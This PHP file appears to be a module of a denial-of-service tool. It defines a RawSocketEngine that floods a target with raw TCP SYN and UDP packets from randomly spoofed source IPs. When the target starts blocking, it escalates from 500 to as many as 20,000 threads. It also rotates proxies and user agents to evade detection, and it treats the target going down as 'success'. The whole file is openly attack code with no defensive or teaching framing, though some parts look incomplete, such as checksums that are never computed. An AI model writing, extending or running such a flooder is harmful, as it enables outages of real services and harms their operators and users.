<?php

require_once __DIR__ . '/../stealth_engine_class.php';
require_once __DIR__ . '/../client_profile_class.php';
require_once __DIR__ . '/../tls_profile_class.php';
require_once __DIR__ . '/../proxy_manager_class.php';

class RawSocketEngine {
    private $config;
    private $stealthEngine;
    private $clientProfile;
    private $tlsProfile;
    private $proxyManager;
    private $rawSockets = [];
    
    public function __construct($config = []) {
        $this->config = array_merge([
            'threads' => 500,
            'duration' => 3600,
            'packet_size' => 1024,
            'packet_rate' => 1000,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'escalation_factor' => 1.5,
            'resistance_threshold' => 0.3,
            'raw_protocols' => ['tcp', 'udp'],
            'spoofing_enabled' => true,
            'fragment_packets' => true
        ], $config);
    }
    
    public function start($target, $groupId, $profile) {
        $this->logMessage("Starting Raw Socket attack on $target with group: $groupId");
        
        if ($this->config['stealth_enabled']) {
            $this->initializeStealth($groupId);
        }
        
        $startTime = time();
        $totalPackets = 0;
        $successCount = 0;
        $errorCodes = [];
        $currentThreads = $this->config['threads'];
        $bytesTransferred = 0;
        
        while (true) {
            if ($this->shouldStop($groupId)) {
                $this->logMessage("Manual stop signal received for group: $groupId");
                break;
            }
            
            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
                $this->logMessage("Success condition met for target: $target in group: $groupId");
                break;
            }
            
            for ($thread = 0; $thread < $currentThreads; $thread++) {
                $batchResults = $this->executeRawSocketBatch($target, $groupId, $profile);
                
                $totalPackets += $batchResults['packets'];
                $successCount += $batchResults['success'];
                $bytesTransferred += $batchResults['bytes'];
                
                foreach ($batchResults['error_codes'] as $code => $count) {
                    $errorCodes[$code] = ($errorCodes[$code] ?? 0) + $count;
                }
                
                if ($this->config['stealth_enabled'] && $totalPackets % 500 === 0) {
                    $this->rotateStealthComponents();
                }
            }
            
            if ($this->shouldEscalate($errorCodes, $totalPackets)) {
                $currentThreads = min($currentThreads * $this->config['escalation_factor'], 20000);
                $this->logMessage("Escalated threads to $currentThreads for $target");
            }
            
            usleep(1000000 / $this->config['packet_rate']);
        }
        
        $this->closeAllSockets();
        
        return [
            'total_packets' => $totalPackets,
            'success_count' => $successCount,
            'error_codes' => $errorCodes,
            'bytes_transferred' => $bytesTransferred,
            'duration' => time() - $startTime,
            'threads_used' => $currentThreads
        ];
    }
    
    private function executeRawSocketBatch($target, $groupId, $profile) {
        $packets = 0;
        $success = 0;
        $errorCodes = [];
        $bytes = 0;
        
        $parsedUrl = parse_url($target);
        $host = $parsedUrl['host'] ?? $target;
        $port = $parsedUrl['port'] ?? 80;
        
        for ($i = 0; $i < $this->config['packet_rate'] / 10; $i++) {
            $protocol = $this->config['raw_protocols'][array_rand($this->config['raw_protocols'])];
            $result = $this->sendRawPacket($host, $port, $protocol);
            
            $packets++;
            $bytes += $result['bytes'];
            
            if ($result['success']) {
                $success++;
            } else {
                $code = $result['error_code'];
                $errorCodes[$code] = ($errorCodes[$code] ?? 0) + 1;
            }
        }
        
        return [
            'packets' => $packets,
            'success' => $success,
            'error_codes' => $errorCodes,
            'bytes' => $bytes
        ];
    }
    
    private function sendRawPacket($host, $port, $protocol = 'tcp') {
        $packetData = $this->generateRawPacket($host, $port, $protocol);
        $bytes = strlen($packetData);
        
        try {
            if ($protocol === 'tcp') {
                $socket = socket_create(AF_INET, SOCK_RAW, SOL_TCP);
            } else {
                $socket = socket_create(AF_INET, SOCK_RAW, SOL_UDP);
            }
            
            if (!$socket) {
                return [
                    'success' => false,
                    'error_code' => 500,
                    'bytes' => 0,
                    'error' => 'Failed to create raw socket'
                ];
            }
            
            socket_set_option($socket, SOL_SOCKET, SO_BROADCAST, 1);
            
            if ($this->config['spoofing_enabled']) {
                $sourceIp = $this->generateRandomIP();
                socket_set_option($socket, IPPROTO_IP, IP_HDRINCL, 1);
            }
            
            $result = socket_sendto($socket, $packetData, $bytes, 0, $host, $port);
            socket_close($socket);
            
            if ($result === false) {
                return [
                    'success' => false,
                    'error_code' => 503,
                    'bytes' => 0,
                    'error' => socket_strerror(socket_last_error())
                ];
            }
            
            return [
                'success' => true,
                'error_code' => 200,
                'bytes' => $bytes,
                'sent_bytes' => $result
            ];
            
        } catch (Exception $e) {
            return [
                'success' => false,
                'error_code' => 500,
                'bytes' => 0,
                'error' => $e->getMessage()
            ];
        }
    }
    
    private function generateRawPacket($host, $port, $protocol) {
        $sourceIp = $this->config['spoofing_enabled'] ? $this->generateRandomIP() : '127.0.0.1';
        $destIp = gethostbyname($host);
        
        if ($protocol === 'tcp') {
            return $this->generateTCPPacket($sourceIp, $destIp, rand(1024, 65535), $port);
        } else {
            return $this->generateUDPPacket($sourceIp, $destIp, rand(1024, 65535), $port);
        }
    }
    
    private function generateTCPPacket($sourceIp, $destIp, $sourcePort, $destPort) {
        $ipHeader = pack('CCnnnCCnNN',
            0x45,                    // Version (4) + Header Length (5)
            0x00,                    // Type of Service
            40,                      // Total Length
            rand(1, 65535),          // Identification
            0x4000,                  // Flags (Don't Fragment) + Fragment Offset
            64,                      // TTL
            6,                       // Protocol (TCP)
            0,                       // Header Checksum (calculated later)
            ip2long($sourceIp),      // Source IP
            ip2long($destIp)         // Destination IP
        );
        
        $tcpHeader = pack('nnNNnnnn',
            $sourcePort,             // Source Port
            $destPort,               // Destination Port
            rand(1, 4294967295),     // Sequence Number
            0,                       // Acknowledgment Number
            0x5002,                  // Header Length (5) + Flags (SYN)
            8192,                    // Window Size
            0,                       // Checksum (calculated later)
            0                        // Urgent Pointer
        );
        
        $payload = str_repeat('A', $this->config['packet_size'] - 40);
        
        if ($this->config['fragment_packets'] && strlen($payload) > 1400) {
            $payload = substr($payload, 0, 1400);
        }
        
        return $ipHeader . $tcpHeader . $payload;
    }
    
    private function generateUDPPacket($sourceIp, $destIp, $sourcePort, $destPort) {
        $payload = str_repeat('U', $this->config['packet_size'] - 28);
        
        $ipHeader = pack('CCnnnCCnNN',
            0x45,                    // Version (4) + Header Length (5)
            0x00,                    // Type of Service
            28 + strlen($payload),   // Total Length
            rand(1, 65535),          // Identification
            0x4000,                  // Flags (Don't Fragment) + Fragment Offset
            64,                      // TTL
            17,                      // Protocol (UDP)
            0,                       // Header Checksum (calculated later)
            ip2long($sourceIp),      // Source IP
            ip2long($destIp)         // Destination IP
        );
        
        $udpHeader = pack('nnnn',
            $sourcePort,             // Source Port
            $destPort,               // Destination Port
            8 + strlen($payload),    // Length
            0                        // Checksum
        );
        
        return $ipHeader . $udpHeader . $payload;
    }
    
    private function generateRandomIP() {
        return rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
    }
    
    private function closeAllSockets() {
        foreach ($this->rawSockets as $socket) {
            if (is_resource($socket)) {
                socket_close($socket);
            }
        }
        $this->rawSockets = [];
        $this->logMessage("Closed all raw sockets");
    }
    
    private function shouldEscalate($errorCodes, $packetCount) {
        if ($packetCount < 100) return false;
        
        $blockCodes = [403, 429, 503];
        $blockCount = 0;
        
        foreach ($blockCodes as $code) {
            $blockCount += $errorCodes[$code] ?? 0;
        }
        
        $blockRate = $blockCount / $packetCount;
        return $blockRate > $this->config['resistance_threshold'];
    }
    
    private function initializeStealth($groupId) {
        $this->stealthEngine = new StealthEngine([
            'session_id' => "raw_socket_$groupId",
            'stealth_level' => 'maximum',
            'rotation_interval' => 20
        ]);
        
        $this->clientProfile = new ClientProfile();
        $this->tlsProfile = new TLSProfile();
        $this->proxyManager = new ProxyManager();
        
        $this->logMessage("Initialized stealth components for Raw Socket group: $groupId");
    }
    
    private function rotateStealthComponents() {
        if ($this->stealthEngine) {
            $rotations = $this->stealthEngine->performEvolutionCycle();
            $this->logMessage("Stealth evolution cycle completed: " . implode(', ', $rotations));
        } else {
            if ($this->config['proxy_rotation']) {
                $this->proxyManager->rotateProxy();
            }
            if ($this->config['ua_rotation']) {
                $this->clientProfile->rotateUserAgent();
            }
        }
    }
    
    private function shouldStop($groupId) {
        $stopFile = "/tmp/stop_signal_$groupId.flag";
        return file_exists($stopFile);
    }
    
    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
        if (empty($errorCodes)) return false;
        
        $totalRequests = array_sum($errorCodes);
        if ($totalRequests < 100) return false;
        
        $successCodes = [404, 410, 503, 524];
        $successCount = 0;
        
        foreach ($successCodes as $code) {
            $successCount += $errorCodes[$code] ?? 0;
        }
        
        $successRate = $successCount / $totalRequests;
        
        if ($successRate >= 0.75) {
            $statusFile = "/tmp/success_status_$groupId.json";
            $status = [
                'target' => $target,
                'success_rate' => $successRate,
                'total_requests' => $totalRequests,
                'success_count' => $successCount,
                'timestamp' => time(),
                'condition_met' => true
            ];
            file_put_contents($statusFile, json_encode($status));
            return true;
        }
        
        return false;
    }
    
    private function logMessage($message) {
        $logFile = './logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] RAW_SOCKET_ENGINE: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}
